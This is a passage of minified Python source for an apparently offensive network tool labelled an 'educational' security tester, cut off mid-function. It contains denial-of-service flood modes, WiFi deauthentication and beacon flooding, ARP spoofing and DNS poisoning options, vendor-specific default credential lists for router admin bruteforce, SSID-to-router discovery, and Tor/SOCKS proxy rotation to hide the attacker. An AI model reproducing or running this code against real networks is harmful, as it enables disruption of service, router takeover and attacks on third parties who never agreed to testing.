_Am='dns_poison'
_Al='arp_spoof'
_Ak='dhcp_starve'
_Aj='wifi_beacon'
_Ai='[X] No SSID provided. Aborting.'
_Ah='(unknown)'
_Ag="[+] Target IP to poison (or 'all' for subnet): "
_Af='[X] IPv4 Raw Attack is NOT available on Windows.'
_Ae='management'
_Ad='Radio type'
_Ac='Authentication'
_Ab='192.168.0.254'
_Aa='192.168.1.254'
_AZ='192.168.0.1'
_AY='192.168.1.1'
_AX='Admin@123'
_AW='!4s4sBBH'
_AV='User-Agent'
_AU='iwconfig'
_AT='(hidden)'
_AS='BSSID'
_AR='0.0.0.0'
_AQ='wifi_deauth'
_AP='12345678'
_AO='mitm'
_AN='domain'
_AM='[+] Router IP: '
_AL='port'
_AK='host'
_AJ='type'
_AI='<title>'
_AH='ignore'
_AG='Signal level:'
_AF='wlan'
_AE='addr'
_AD='netsh'
_AC='icmp_flood'
_AB='udp_flood'
_AA='syn_flood'
_A9='ubnt'
_A8='cisco'
_A7='syn'
_A6='[*] Running INFINITE — press Ctrl+C to stop\n'
_A5='[*] Running INFINITE packets — press Ctrl+C to stop\n'
_A4='http'
_A3='enabled'
_A2='radio'
_A1='show'
_A0='Arris'
_z='Technicolor'
_y='root'
_x='1234'
_w='router_multi'
_v='router_http_flood'
_u='router_bruteforce'
_t='recon'
_s='!HHLLBBHHH'
_r='failures'
_q='wifi'
_p='auth'
_o='Unknown'
_n='multi_vector'
_m='router_slowloris'
_l='ssid_bruteforce'
_k='router_kill'
_j='tors_hammer'
_i='http_flood'
_h='ZyXEL'
_g='Belkin'
_f='Tenda'
_e='2'
_d='socks5'
_c='ipv4_raw'
_b='MikroTik'
_a='Xiaomi'
_Z='Huawei'
_Y='ff:ff:ff:ff:ff:ff'
_X='─'
_W='!BBHHHBBH4s4s'
_V='signal'
_U='password'
_T='127.0.0.1'
_S='Netgear'
_R='Linksys'
_Q='channel'
_P='Cisco'
_O='D-Link'
_N='1'
_M='Ubiquiti'
_L='Asus'
_K='ip'
_J='\n'
_I='bssid'
_H='?'
_G='ssid'
_F='TP-Link'
_E=False
_D=':'
_C=None
_B=True
_A='admin'
import os,sys,time,random,string,socket,struct,threading,argparse,textwrap,itertools,json,subprocess,platform,ipaddress,hashlib,binascii,select,signal,re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor,as_completed
from collections import deque,defaultdict
IS_WINDOWS=platform.system()=='Windows'
IS_LINUX=platform.system()=='Linux'
IS_MAC=platform.system()=='Darwin'
if IS_WINDOWS:
	try:import ctypes;kernel32=ctypes.windll.kernel32;kernel32.SetConsoleMode(kernel32.GetStdHandle(-11),7)
	except Exception:pass
SOCKS_AVAILABLE=_E
socks_module=_C
try:import socks as _socks;SOCKS_AVAILABLE=_B;socks_module=_socks
except ImportError:
	try:import sockshandler as _socks;SOCKS_AVAILABLE=_B;socks_module=_socks
	except ImportError:pass
if not SOCKS_AVAILABLE:
	print('[!] PySocks not found. Tor/SOCKS5 proxy support will be limited.');print('[!] Install it with:  pip install pysocks');print('[!] Attempting auto‑install via pip...')
	try:subprocess.check_call([sys.executable,'-m','pip','install','pysocks','-q'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);import socks as _socks;SOCKS_AVAILABLE=_B;socks_module=_socks;print('[OK] PySocks installed successfully!')
	except Exception:print('[!] Auto‑install failed. Run: pip install pysocks')
SCAPY_AVAILABLE=_E
try:from scapy.all import ARP,Ether,IP,TCP,UDP,ICMP,DNS,DNSQR,Raw,send,sendp,sniff,sr1,srp,wrpcap,rdpcap,Dot11,Dot11Deauth,Dot11Beacon,Dot11Elt,Dot11ProbeReq,Dot11ProbeResp,Dot11Auth,Dot11AssoReq,Dot11AssoResp,RadioTap,conf,get_if_hwaddr;SCAPY_AVAILABLE=_B
except ImportError:print('[!] Scapy not found. Advanced WiFi/Router attacks will be limited.');print('[!] Install with: pip install scapy')
NPCAP_AVAILABLE=_E
if IS_WINDOWS and SCAPY_AVAILABLE:
	try:
		result=subprocess.run(['sc','query','npcap'],capture_output=_B,text=_B)
		if'RUNNING'in result.stdout:NPCAP_AVAILABLE=_B
		else:
			result2=subprocess.run(['sc','query','npf'],capture_output=_B,text=_B)
			if'RUNNING'in result2.stdout:NPCAP_AVAILABLE=_B
	except Exception:pass
	if NPCAP_AVAILABLE:print('[OK] Npcap/WinPcap detected — Windows raw WiFi injection available!')
	else:print('[!] Npcap not detected. WiFi deauth will use netsh fallback on Windows.');print('[!] Install Npcap from: https://npcap.com/ for raw WiFi injection.')
NETIFACES_AVAILABLE=_E
if not IS_WINDOWS:
	try:import netifaces;NETIFACES_AVAILABLE=_B
	except ImportError:
		try:subprocess.check_call([sys.executable,'-m','pip','install','netifaces','-q'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);import netifaces;NETIFACES_AVAILABLE=_B
		except Exception:pass
DEFAULT_PORTS=[20,21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1521,1723,2082,2083,3000,3306,3389,5000,5432,5900,6379,8000,8080,8443,8888,9000,9090,9200,11211,27017]
ROUTER_PORTS=[80,443,8080,8443,23,22,53,67,68,1900,5353,5000]
MAX_WORKERS_DEFAULT=300
SOCKET_TIMEOUT=1.2
SLOWLORIS_SOCKET_TIMEOUT=10
TOR_PROXY='socks5h://127.0.0.1:9050'
stop_event=threading.Event()
packets_lock=threading.Lock()
packets_sent=0
bytes_sent=0
connections_active=0
connections_lock=threading.Lock()
start_time=_C
router_targets={}
arp_cache={}
router_disruption_active=_E
USER_AGENTS=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0','Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0','Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0','Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0']
ROUTER_CREDENTIALS=[(_A,_A),(_A,_U),(_A,_x),(_A,''),(_y,_y),(_y,_A),(_A,'password123'),(_A,'admin123'),('user','user'),(_A,_AP),(_A,'123456789'),(_A,'12345'),(_A,'admin1234'),(_A,'pass'),(_A,'123456'),(_A,'admin@123'),(_A,_AX)]
ROUTER_CREDENTIALS_BY_VENDOR={_F:[(_A,_A),(_A,_x),(_A,_U)],_R:[(_A,_A),(_A,''),(_A,_U)],_S:[(_A,_U),(_A,_x),(_A,_A)],_O:[(_A,_A),(_A,''),(_A,_U)],_L:[(_A,_A),(_A,_U),(_A,_x)],_P:[(_A,_A),(_A,_A8),(_A8,_A8)],_M:[(_A9,_A9),(_A,_A),(_y,_A9)],_Z:[(_A,_A),(_A,_AX),(_y,_A)],_a:[(_A,_A),(_A,_AP)],_f:[(_A,_A),(_A,_AP)],_g:[(_A,_A),(_A,''),(_A,_U)],_h:[(_A,_x),(_A,_A),(_A,_U)],_z:[(_A,_A),(_A,_U)],_A0:[(_A,_U),(_A,_A)],'Motorola':[(_A,'motorola'),(_A,_A)],_b:[(_A,''),(_A,_A)]}
ATTACK_EXPLANATIONS={_i:"\n    ╔══════════════════════ HTTP/HTTPS FLOOD ══════════════════════╗\n    ║  WHAT:   Sends massive numbers of HTTP requests from many    ║\n    ║          worker threads simultaneously. Each request uses    ║\n    ║          random paths and User-Agents.                       ║\n    ║  GOAL:   Exhaust the web server's connection pool.           ║\n    ║  ROUTER IMPACT: Router admin panels have limited resources.  ║\n    ║  BEST FOR: Web servers, router admin panels.                 ║\n    ║  EFFICIENCY: 200-500 threads; with proxies for IP rotation.  ║\n    ║  WORKS ON: ALL platforms (Windows, Linux, macOS)             ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ",_AA:"\n    ╔═══════════════════════ SYN FLOOD ═══════════════════════════╗\n    ║  WHAT:   Sends spoofed TCP SYN packets at high speed.       ║\n    ║  GOAL:   Fill the target's SYN backlog queue.               ║\n    ║  ⚠ REQUIRES ROOT + Linux (raw sockets)                      ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ",_AB:'\n    ╔═══════════════════════ UDP FLOOD ═══════════════════════════╗\n    ║  WHAT:   High‑speed UDP datagrams with random payload.      ║\n    ║  GOAL:   Saturate bandwidth.                                ║\n    ║  WORKS ON: ALL platforms                                    ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ',_AC:'\n    ╔═══════════════════════ ICMP FLOOD ══════════════════════════╗\n    ║  WHAT:   ICMP Echo Request (ping) flood.                    ║\n    ║  ⚠ REQUIRES ROOT + Linux/macOS (raw sockets)                ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ',_j:"\n    ╔═══════════════════ TOR'S HAMMER / SLOWLORIS ════════════════╗\n    ║  WHAT:   Opens many HTTP connections and sends partial       ║\n    ║          headers extremely slowly. ADDITIVE mode.            ║\n    ║  GOAL:   Exhaust the server's connection pool.              ║\n    ║  WORKS ON: ALL platforms                                    ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ",_n:'\n    ╔══════════════════ MULTI‑VECTOR ASSAULT ═════════════════════╗\n    ║  WHAT:   HTTP + UDP + Slowloris + ICMP simultaneously.      ║\n    ║  WORKS ON: ALL platforms (ICMP skipped on Windows)          ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ',_c:'\n    ╔══════════════════ IPv4 RAW NETWORK ATTACK ══════════════════╗\n    ║  WHAT:   Auto‑detects open ports then infinite raw barrage. ║\n    ║  ⚠ REQUIRES ROOT + Linux (AF_PACKET)                        ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ',_k:'\n    ╔══════════════════ ROUTER CONNECTION KILL ═══════════════════╗\n    ║  WHAT:   NAT exhaustion + CPU saturation + bandwidth hog.   ║\n    ║  WORKS ON: ALL platforms                                    ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ',_AQ:'\n    ╔═══════════════════ WiFi DEAUTHENTICATION ═══════════════════╗\n    ║  WINDOWS: Uses netsh wlan disconnect (persistent disconnect) ║\n    ║  LINUX:   Uses Scapy 802.11 deauth frames (monitor mode)    ║\n    ║  WORKS ON: BOTH Windows AND Linux!                          ║\n    ║                                                              ║\n    ║  WINDOWS MODE: Repeatedly disconnects from target network.  ║\n    ║  Effect: Clients cannot maintain stable connection.          ║\n    ║                                                              ║\n    ║  LINUX MODE: Sends forged 802.11 deauthentication frames.   ║\n    ║  Requires monitor mode interface + root.                    ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ','wifi_beacon_flood':'\n    ╔══════════════════ WiFi BEACON FLOOD ════════════════════════╗\n    ║  WHAT:   Broadcasts thousands of fake WiFi beacon frames.   ║\n    ║  ⚠ REQUIRES: Root + Scapy + monitor mode (Linux only)       ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ',_l:'\n    ╔══════════════════ SSID‑BASED ROUTER BRUTEFORCE ═════════════╗\n    ║  WHAT:   Enter a WiFi SSID → auto‑detect router IP → brute   ║\n    ║          force admin panel login.                            ║\n    ║                                                              ║\n    ║  HOW IT WORKS:                                              ║\n    ║  1. You provide a WiFi network name (SSID)                   ║\n    ║  2. Tool finds the router IP via:                            ║\n    ║     • Windows: netsh wlan show interfaces → gateway          ║\n    ║     • Linux:   nmcli/iwconfig → gateway                      ║\n    ║     • Fallback: subnet scan for open ports 80/443            ║\n    ║  3. Auto‑detects vendor from MAC OUI (TP-Link, Netgear, etc)║\n    ║  4. Uses vendor‑specific default credentials first            ║\n    ║  5. Then tries comprehensive credential list                  ║\n    ║                                                              ║\n    ║  WORKS ON: ALL platforms (Windows, Linux, macOS)             ║\n    ╚══════════════════════════════════════════════════════════════╝\n    ','router_login_bruteforce':'\n    ╔══════════════════ ROUTER LOGIN BRUTEFORCE ══════════════════╗\n    ║  WHAT:   Direct IP-based router admin panel bruteforce.      ║\n    ║  WORKS ON: ALL platforms                                    ║\n    ╚══════════════════════════════════════════════════════════════╝\n    '}
def banner():print(textwrap.dedent('\n    ╔══════════════════════════════════════════════════════════════════════╗\n    ║   COMPREHENSIVE NETWORK SECURITY TESTER (Educational Purpose Only)  ║\n    ║   Use ONLY on systems you own or have explicit permission           ║\n    ║   ALL ATTACKS RUN INFINITE PACKETS — Ctrl+C to stop                 ║\n    ║   Cross‑Platform: Windows | Linux | macOS                           ║\n    ║                                                                      ║\n    ║   ★ NEW: WiFi Deauth on WINDOWS (netsh‑based)                       ║\n    ║   ★ NEW: SSID‑Based Router Bruteforce (auto‑detect + vendor)        ║\n    ╚══════════════════════════════════════════════════════════════════════╝\n    '))
def check_root():
	if IS_WINDOWS:
		try:import ctypes;return ctypes.windll.shell32.IsUserAnAdmin()!=0
		except Exception:return _E
	else:
		try:return os.geteuid()==0
		except AttributeError:return _E
def random_path():length=random.randint(3,16);chars=string.ascii_letters+string.digits+'-_';return'/'+''.join(random.choices(chars,k=length))
def random_ipv4():return'.'.join(str(random.randint(1,254))for _ in range(4))
def random_mac():return _D.join(f"{random.randint(0,255):02x}"for _ in range(6))
def random_referer(host=''):domains=['google.com','bing.com','yahoo.com','duckduckgo.com','facebook.com','twitter.com','reddit.com',host];return f"https://{random.choice(domains)}/{random_path()}"
def increment_packets(count=1,byte_count=0):
	global packets_sent,bytes_sent
	with packets_lock:packets_sent+=count;bytes_sent+=byte_count
def get_packets():
	with packets_lock:return packets_sent
def get_bytes():
	with packets_lock:return bytes_sent
def get_elapsed():
	global start_time
	if start_time is _C:return .0
	return time.time()-start_time
def format_rate():
	elapsed=get_elapsed()
	if elapsed<.001:return'calculating...'
	pkts=get_packets();bts=get_bytes();pps=pkts/elapsed
	if bts>0:mbps=bts*8/(elapsed*1000000);return f"{pkts} pkts | {pps:,.0f} pps | {mbps:.2f} Mbps"
	return f"{pkts} pkts | {pps:,.0f} pps"
def checksum(data):
	if len(data)%2==1:data+=b'\x00'
	total=sum(struct.unpack('!%dH'%(len(data)//2),data));total=(total>>16)+(total&65535);total+=total>>16;return~total&65535
def stats_reporter(interval=2.):
	last_pkts=0
	while not stop_event.is_set():
		time.sleep(interval)
		if stop_event.is_set():break
		current=get_packets();elapsed=get_elapsed()
		if elapsed>0:instant_pps=(current-last_pkts)/interval;avg_pps=current/elapsed;print(f"    [Stats] Total: {current:>10,} pkts | Instant: {instant_pps:>8,.0f} pps | Avg: {avg_pps:>8,.0f} pps | Elapsed: {elapsed:>6.1f}s")
		last_pkts=current
def get_default_gateway():
	B='Default Gateway';A='00000000'
	try:
		if IS_LINUX:
			with open('/proc/net/route')as f:
				for line in f:
					fields=line.strip().split()
					if fields[1]==A and fields[7]!=A:gw=socket.inet_ntoa(struct.pack('<L',int(fields[2],16)));return gw
		elif IS_MAC:
			result=subprocess.run(['netstat','-rn'],capture_output=_B,text=_B)
			for line in result.stdout.split(_J):
				if'default'in line:
					parts=line.split()
					if len(parts)>=2:return parts[1]
		elif IS_WINDOWS:
			try:
				result=subprocess.run([_AD,'interface',_K,_A1,'addresses'],capture_output=_B,text=_B)
				for line in result.stdout.split(_J):
					if B in line:
						parts=line.split(_D)
						if len(parts)>=2:
							gw=parts[-1].strip()
							if gw and gw!='':return gw
			except Exception:pass
			result=subprocess.run(['ipconfig'],capture_output=_B,text=_B)
			for line in result.stdout.split(_J):
				if B in line:
					parts=line.split(_D)
					if len(parts)>=2:
						gw=parts[-1].strip()
						if gw and gw!='':return gw
			result2=subprocess.run(['route','print',_AR],capture_output=_B,text=_B)
			for line in result2.stdout.split(_J):
				if _AR in line:
					parts=line.split()
					if len(parts)>=4:return parts[3]
	except Exception:pass
	for ip in[_AY,_AZ,'10.0.0.1',_Aa,_Ab]:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(.5)
			if s.connect_ex((ip,80))==0 or s.connect_ex((ip,443))==0:s.close();return ip
			s.close()
		except Exception:pass
def get_local_ip():
	try:s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(('8.8.8.8',80));ip=s.getsockname()[0];s.close();return ip
	except Exception:return _T
def get_local_mac(interface=_C):
	try:
		if not IS_WINDOWS and NETIFACES_AVAILABLE and interface:return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0][_AE]
		import uuid;mac=uuid.getnode();return _D.join([f"{mac>>elements&255:02x}"for elements in range(0,12,2)][::-1])
	except Exception:return
def get_network_interfaces():
	interfaces=[]
	try:
		if not IS_WINDOWS and NETIFACES_AVAILABLE:
			for iface in netifaces.interfaces():
				addrs=netifaces.ifaddresses(iface)
				if netifaces.AF_INET in addrs:
					ip=addrs[netifaces.AF_INET][0][_AE];mac=''
					if netifaces.AF_LINK in addrs:mac=addrs[netifaces.AF_LINK][0].get(_AE,'')
					interfaces.append((iface,ip,mac))
		elif IS_WINDOWS:
			result=subprocess.run(['ipconfig','/all'],capture_output=_B,text=_B);current_iface='';current_ip='';current_mac=''
			for line in result.stdout.split(_J):
				line=line.strip()
				if'adapter'in line.lower()and _D in line:
					if current_iface and current_ip:interfaces.append((current_iface,current_ip,current_mac))
					current_iface=line.split(_D)[0].strip().replace('adapter ','');current_ip='';current_mac=''
				elif'IPv4 Address'in line or'IP Address'in line:
					parts=line.split(_D)
					if len(parts)>=2:current_ip=parts[-1].strip().rstrip('(Preferred)').strip()
				elif'Physical Address'in line:
					parts=line.split(_D)
					if len(parts)>=2:current_mac=parts[-1].strip().replace('-',_D)
			if current_iface and current_ip:interfaces.append((current_iface,current_ip,current_mac))
		else:
			result=subprocess.run([_K,_AE,_A1],capture_output=_B,text=_B);current_iface=''
			for line in result.stdout.split(_J):
				if line and not line.startswith(' '):
					parts=line.split(_D)
					if len(parts)>=2:current_iface=parts[1].strip()
				elif'inet 'in line:
					parts=line.strip().split()
					if len(parts)>=2:ip=parts[1].split('/')[0];interfaces.append((current_iface,ip,''))
	except Exception:pass
	return interfaces
def get_oui_lookup(mac_prefix):
	G='Comtrend';F='00:15:6d';E='00:1b:63';D='ZTE';C='VMware';B='Microsoft';A='Apple';oui_db={'00:1a:79':_P,E:_P,'00:1c:0f':_P,'00:1e:4a':_P,'00:1e:f7':_P,'00:23:33':_P,'00:25:84':_P,'00:26:0b':_P,'00:3a:7d':_P,'00:0c:41':_R,'00:12:17':_R,'00:13:10':_R,'00:18:39':_R,'00:1d:7e':_R,'00:1e:e5':_R,'00:21:29':_R,'00:22:6b':_R,'00:25:9c':_R,'00:14:6c':_S,'00:18:4d':_S,'00:1b:2f':_S,'00:1e:2a':_S,'00:22:3f':_S,'00:24:b2':_S,'00:26:f2':_S,'00:30:ab':_S,'00:0f:b5':_S,'00:14:bf':_O,'00:17:9a':_O,'00:1b:11':_O,'00:1c:f0':_O,'00:1e:58':_O,'00:21:91':_O,'00:22:b0':_O,'00:24:01':_O,'00:26:5a':_O,'00:14:22':_F,'00:19:e0':_F,'00:1d:0f':_F,'00:21:27':_F,'00:23:cd':_F,'00:25:86':_F,'00:27:19':_F,'f4:f2:6d':_F,'50:c7:bf':_F,'10:27:f5':_F,'18:a6:f7':_F,'e8:94:f6':_F,'ec:08:6b':_F,'b0:4e:26':_F,'c0:25:e9':_F,'00:14:a4':_L,'00:18:f3':_L,'00:1d:60':_L,'00:22:15':_L,'00:23:54':_L,'00:24:8c':_L,'00:26:18':_L,'08:60:6e':_L,'38:2c:4a':_L,'0c:9d:92':_L,'1c:b7:2c':_L,'2c:4d:54':_L,'00:03:93':A,'00:0a:27':A,'00:0d:93':A,'00:14:51':A,'00:17:f2':A,E:A,'00:1d:4f':A,'00:1e:52':A,'00:1f:5b':A,'00:21:e9':A,'00:22:41':A,'00:23:12':A,'00:23:df':A,'00:24:36':A,'00:25:00':A,'00:25:bc':A,'00:26:08':A,'00:26:b0':A,'04:0c:ce':A,'08:66:98':A,'00:15:5d':B,'00:1d:d8':B,'00:22:48':B,'00:25:ae':B,'00:0c:29':C,'00:50:56':C,'00:05:69':C,'08:00:27':'VirtualBox','00:16:3e':'Xen','00:1a:1e':_M,F:_M,'00:27:22':_M,'04:18:d6':_M,'24:a4:3c':_M,'fc:ec:da':_M,'dc:9f:db':_M,'44:d9:e7':_M,'78:8a:20':_M,'b4:fb:e4':_M,'80:2a:a8':_M,'28:6e:d4':_Z,'00:18:82':_Z,'00:25:9e':_Z,'00:e0:fc':_Z,'08:19:a6':_Z,'24:db:ac':_Z,'34:29:12':_a,'64:64:4b':_a,'78:11:dc':_a,'8c:be:be':_a,'98:3b:16':_a,'c8:3a:35':_f,'00:b0:0c':_f,'14:75:90':_f,'50:2b:73':_f,'b0:df:c1':_f,'00:11:50':_g,'00:17:3f':_g,'00:22:75':_g,'94:10:3e':_g,'ec:1a:59':_g,'00:13:49':_h,'00:19:cb':_h,'00:a0:c5':_h,'04:bf:6d':_h,'cc:5d:4e':_h,'00:1d:19':_z,'00:1e:33':_z,'00:24:17':_z,'00:1e:46':_A0,'00:1e:8c':_A0,'14:c0:3e':_A0,'00:0b:06':G,'00:0b:6b':G,'00:0c:42':_b,F:_b,'4c:5e:0c':_b,'6c:3b:6b':_b,'d4:ca:6d':_b,'00:1a:70':D,'00:1e:73':D,'00:23:3b':D,'14:cc:20':_F,'50:d4:f7':_F,'68:ff:7b':_F,'a0:f3:c1':_F,'ac:84:c6':_F,'d8:47:32':_F};mac_prefix=mac_prefix.lower().replace('-',_D)[:8]
	for(prefix,vendor)in oui_db.items():
		if mac_prefix.startswith(prefix.lower()):return vendor
	return _o
def scan_wifi_networks():
	C='Channel:';B='Address:';A='ESSID:';networks=[]
	if IS_WINDOWS:
		try:
			result=subprocess.run([_AD,_AF,_A1,'networks','mode=bssid'],capture_output=_B,text=_B);current_ssid='';current_bssid='';current_channel='';current_signal='';current_auth='';current_radio=''
			for line in result.stdout.split(_J):
				line=line.strip()
				if line.startswith('SSID')and _D in line:
					if current_ssid and current_bssid:networks.append({_G:current_ssid,_I:current_bssid,_Q:current_channel,_V:current_signal,_p:current_auth,_A2:current_radio})
					parts=line.split(_D,1);ssid=parts[1].strip()if len(parts)>1 else''
					if ssid:current_ssid=ssid;current_bssid='';current_channel='';current_signal='';current_auth='';current_radio=''
				elif _AS in line and _D in line:parts=line.split(_D,1);current_bssid=parts[1].strip()if len(parts)>1 else''
				elif'Channel'in line and _D in line:parts=line.split(_D,1);current_channel=parts[1].strip()if len(parts)>1 else''
				elif'Signal'in line and _D in line:parts=line.split(_D,1);current_signal=parts[1].strip()if len(parts)>1 else''
				elif _Ac in line and _D in line:parts=line.split(_D,1);current_auth=parts[1].strip()if len(parts)>1 else''
				elif _Ad in line and _D in line:parts=line.split(_D,1);current_radio=parts[1].strip()if len(parts)>1 else''
			if current_ssid and current_bssid:networks.append({_G:current_ssid,_I:current_bssid,_Q:current_channel,_V:current_signal,_p:current_auth,_A2:current_radio})
		except Exception as e:print(f"[!] WiFi scan error: {e}")
	else:
		try:
			result=subprocess.run(['nmcli','-t','-f','SSID,BSSID,CHAN,SIGNAL,SECURITY','dev',_q,'list'],capture_output=_B,text=_B)
			for line in result.stdout.split(_J):
				if _D in line:
					parts=line.split(_D)
					if len(parts)>=4:networks.append({_G:parts[0]if parts[0]else _AT,_I:parts[1]if len(parts)>1 else'',_Q:parts[2]if len(parts)>2 else'',_V:parts[3]if len(parts)>3 else'',_p:parts[4]if len(parts)>4 else'',_A2:''})
		except Exception:pass
		if not networks:
			try:
				result=subprocess.run([_AU],capture_output=_B,text=_B);iface=''
				for line in result.stdout.split(_J):
					if'IEEE 802.11'in line:iface=line.split()[0];break
				if iface:
					result=subprocess.run(['sudo','iwlist',iface,'scan'],capture_output=_B,text=_B);current_ssid='';current_bssid='';current_channel='';current_signal=''
					for line in result.stdout.split(_J):
						line=line.strip()
						if A in line:current_ssid=line.split(A)[1].strip().strip('"')
						elif B in line:current_bssid=line.split(B)[1].strip()
						elif C in line:current_channel=line.split(C)[1].strip()
						elif _AG in line:
							current_signal=line.split(_AG)[1].strip()
							if current_ssid:networks.append({_G:current_ssid,_I:current_bssid,_Q:current_channel,_V:current_signal,_p:'',_A2:''})
			except Exception:pass
	return networks
def get_current_wifi_info():
	B='Frequency:';A='Access Point:'
	if IS_WINDOWS:
		try:
			result=subprocess.run([_AD,_AF,_A1,'interfaces'],capture_output=_B,text=_B);info={}
			for line in result.stdout.split(_J):
				line=line.strip()
				if'SSID'in line and _AS not in line and _D in line:parts=line.split(_D,1);info[_G]=parts[1].strip()if len(parts)>1 else''
				elif _AS in line and _D in line:parts=line.split(_D,1);info[_I]=parts[1].strip()if len(parts)>1 else''
				elif'Channel'in line and _D in line:parts=line.split(_D,1);info[_Q]=parts[1].strip()if len(parts)>1 else''
				elif'Signal'in line and _D in line:parts=line.split(_D,1);info[_V]=parts[1].strip()if len(parts)>1 else''
				elif _Ad in line and _D in line:parts=line.split(_D,1);info[_A2]=parts[1].strip()if len(parts)>1 else''
				elif _Ac in line and _D in line:parts=line.split(_D,1);info[_p]=parts[1].strip()if len(parts)>1 else''
			return info if info else _C
		except Exception:return
	else:
		try:
			result=subprocess.run(['nmcli','-t','-f','GENERAL.CONNECTION','device',_A1],capture_output=_B,text=_B);info={}
			for line in result.stdout.split(_J):
				if'GENERAL.CONNECTION:'in line:info[_G]=line.split(_D,1)[1].strip()
			if info.get(_G):
				result2=subprocess.run([_AU],capture_output=_B,text=_B)
				for line in result2.stdout.split(_J):
					if A in line:info[_I]=line.split(A)[1].strip()
					elif B in line:info[_Q]=line.split(B)[1].strip()
					elif _AG in line:info[_V]=line.split(_AG)[1].strip()
				return info if info else _C
		except Exception:return
def find_router_by_ssid(target_ssid):
	print(f"\n[*] Searching for router with SSID: '{target_ssid}'...");current=get_current_wifi_info()
	if current and current.get(_G,'').lower()==target_ssid.lower():
		print(f"[OK] Currently connected to '{target_ssid}'!");router_ip=get_default_gateway()
		if router_ip:bssid=current.get(_I,'');vendor=get_oui_lookup(bssid)if bssid else _o;print(f"[OK] Router IP: {router_ip} | BSSID: {bssid} | Vendor: {vendor}");return router_ip,vendor,bssid
	networks=scan_wifi_networks();matching=[n for n in networks if n.get(_G,'').lower()==target_ssid.lower()]
	if matching:
		net=matching[0];bssid=net.get(_I,'');vendor=get_oui_lookup(bssid)if bssid else _o;print(f"[OK] Found SSID '{target_ssid}'");print(f"    BSSID: {bssid} | Channel: {net.get(_Q,_H)} | Signal: {net.get(_V,_H)} | Vendor: {vendor}");router_ip=get_default_gateway()
		if router_ip:print(f"[OK] Router IP (gateway): {router_ip}");return router_ip,vendor,bssid
		print('[*] Scanning for router IP on common addresses...')
		for ip in[_AY,_AZ,'10.0.0.1',_Aa,_Ab,'192.168.2.1','192.168.10.1','192.168.100.1','10.0.0.138']:
			try:
				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(.3)
				if s.connect_ex((ip,80))==0:s.close();print(f"[OK] Router found at: {ip} (port 80 open)");return ip,vendor,bssid
				s.close()
			except Exception:pass
	print('[*] Full network scan for router...');local_ip=get_local_ip()
	if local_ip!=_T:
		parts=local_ip.split('.');subnet_base=f"{parts[0]}.{parts[1]}.{parts[2]}"
		for i in[1,254]+list(range(2,10))+list(range(245,254)):
			ip=f"{subnet_base}.{i}"
			if ip==local_ip:continue
			try:
				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(.2)
				if s.connect_ex((ip,80))==0:
					s.close()
					try:
						import urllib.request;req=urllib.request.Request(f"http://{ip}/",headers={_AV:USER_AGENTS[0]});resp=urllib.request.urlopen(req,timeout=2);html=resp.read(4096).decode(errors=_AH);title=''
						if _AI in html.lower():title=html.lower().split(_AI)[1].split('</title>')[0]
						router_keywords=['router','login',_A,'tp-link','netgear','d-link','linksys','asus','gateway','modem','setup','wizard',_Ae,'dd-wrt','openwrt']
						if any(kw in title.lower()for kw in router_keywords):print(f"[OK] Router found at: {ip} (title: {title})");return ip,'Unknown (detected by scan)',''
					except Exception:pass
					print(f"[OK] Potential router at: {ip} (port 80 open)");return ip,_o,''
				s.close()
			except Exception:pass
	print('[X] Could not find router for SSID: '+target_ssid);return _C,_C,_C
class ProxyManager:
	def __init__(self):self.proxies=[];self.current_index=0;self.lock=threading.Lock()
	def add_proxy(self,proxy_type,host,port,description=''):self.proxies.append({_AJ:proxy_type,_AK:host,_AL:port,'desc':description,_r:0,_A3:_B})
	def add_tor(self):self.add_proxy(_d,_T,9050,'Tor (port 9050)');self.add_proxy(_d,_T,9150,'Tor Browser (port 9150)')
	def add_common_vpn_proxies(self):
		common=[(_d,_T,1080,'SOCKS5 Local'),(_A4,_T,8080,'HTTP Proxy Local'),(_A4,_T,3128,'Squid Proxy'),(_d,_T,10808,'SOCKS5 Alt')]
		for(ptype,host,port,desc)in common:self.add_proxy(ptype,host,port,desc)
	def add_custom_proxy(self,address):
		A='://';addr=address.strip();ptype=_d
		if A in addr:ptype,addr=addr.split(A,1);ptype=ptype.lower().strip()
		if _D in addr:
